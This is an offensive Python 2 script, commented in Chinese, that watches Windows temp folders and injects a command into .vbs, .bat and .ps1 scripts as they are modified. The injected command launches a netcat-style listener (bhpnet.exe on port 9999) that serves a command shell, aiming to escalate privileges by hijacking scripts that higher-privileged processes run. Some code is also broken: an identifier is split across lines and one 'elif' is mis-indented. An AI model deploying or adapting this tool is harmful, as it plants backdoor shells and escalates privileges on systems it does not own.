#!/usr/bin/python
#-*- coding:utf-8 -*-
#监视临时文件夹改动，寻找高权限创建的临时脚本，插入恶意代码

import tempfile
import threading
import win32file
import win32con
import os

#需要监视的临时文件夹
dirs_to_monitor = ["C:\\WINDOWS\\Temp",tempfile.gettempdir()]

#定义修改类型
FILE_CREATED      = 1
FILE_DELETED      = 2
FILE_MODIFIED     = 3
FILE_RENAMED_FROM = 4
FILE_RENAMED_TO   = 5

#插入代码
file_types = {}
command = "C:\\WINDOWS\\TEMP\\bhpnet.exe -l -p 9999 -c"
#各类脚本写法
file_types['.vbs'] = ["\r\n'bhpmarker\r\n","\r\nCreateObject(\"Wscript.Shell\").Run(\"%s\")\r\n" %command]
file_types['.bat'] = ["\r\nREM bhpmarker\r\n","\r\n%s\r\n" % command]
file_types['.ps1'] = ["\r\n#bhpmarker","Start-Process \"%s\"\r\n" % command]

def inject_code(full_filename,extension,contents):
    #是否已经插入
    if file_types[extension][0] in contents:
        return

    full_contents = file_types[extension][0]
    full_contents += file_types[extension][1]
    full_contents += contents
    #以二进制追加模式打开文件
    fd = open(full_filename,"wb")
    #写入脚本命令
    fd.write(full_contents)
    fd.close()
    print "[\o/] Injected code."
    return

#开始监视
def start_monitor(path_to_watch):
    #每个监视器起一个进程
    FILE_LIST_DIRECTORY = 0x0001

    #传入文件夹路径，调用CreateFile获得文件夹句柄
    h_directory = win32file.CreateFile(
        path_to_watch,
        FILE_LIST_DIRECTORY,
        win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE | win32con.FILE_
        SHARE_DELETE,
        None,
        win32con.OPEN_EXISTING,
        win32con.FILE_FLAG_BACKUP_SEMANTICS,
        None)

    while 1:
        try:
            #传入文件夹句柄h_directory，调用ReadDirectoryChangesW监视文件夹变动
            results = win32file.ReadDirectoryChangesW(
                  h_directory,
                  1024,
                  True,
                  win32con.FILE_NOTIFY_CHANGE_FILE_NAME |
                  win32con.FILE_NOTIFY_CHANGE_DIR_NAME |
                  win32con.FILE_NOTIFY_CHANGE_ATTRIBUTES |
                  win32con.FILE_NOTIFY_CHANGE_SIZE |
                  win32con.FILE_NOTIFY_CHANGE_LAST_WRITE |
                  win32con.FILE_NOTIFY_CHANGE_SECURITY,
                  None,
                  None
                  )
            #迭代返回的文件变动信息
            for action,file_name in results:
                full_filename = os.path.join(path_to_watch, file_name)
                #创建
                if action == FILE_CREATED:
                    print "[ + ] Created %s" % full_filename
                #删除
                elif action == FILE_DELETED:
                    print "[ - ] Deleted %s" % full_filename
                #修改
                    elif action == FILE_MODIFIED:
                    print "[ * ] Modified %s" % full_filename
                    print "[vvv] Dumping contents..."
                    try:
                        fd = open(full_filename,"rb")
                        contents = fd.read()
                        fd.close()
                        print contents
                        print "[^^^] Dump complete."
                    except:
                        print "[!!!] Failed."

                    filename,extension = os.path.splitext(full_filename)
                    if extension in file_types:
                        inject_code(full_filename,extension,contents)

                #重命名
                elif action == FILE_RENAMED_FROM:
                    print "[ > ] Renamed from: %s" % full_filename
                elif action == FILE_RENAMED_TO:
                    print "[ < ] Renamed to: %s" % full_filename
                else:
                    print "[???] Unknown: %s" % full_filename
        except:
            pass

for path in dirs_to_monitor:
    monitor_thread = threading.Thread(target=start_monitor,args=(path,))
    print "Spawning monitoring thread for path: %s" % path
    monitor_thread.start()
